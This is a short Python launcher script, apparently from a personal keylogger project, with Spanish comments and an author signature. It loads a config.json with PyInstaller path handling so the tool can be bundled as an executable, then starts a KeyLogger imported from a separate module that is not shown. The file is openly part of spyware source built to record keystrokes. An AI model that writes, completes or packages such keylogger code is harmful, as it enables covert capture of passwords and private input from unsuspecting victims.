
# Imports
from keylogger_manager import KeyLogger
import os, sys

# Obtener Ruta Absoluta
def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# Main
def main():

    # Ruta Absoluta de config.json
    Ruta_Config = resource_path("config.json")

    # Iniciar KeyLogger
    kl = KeyLogger(ruta_config=Ruta_Config)
    kl.iniciar_primer_plano()

if __name__ == "__main__":
    main()

    #     \____/\
    #     /\  /\
    #    -byRyanAg...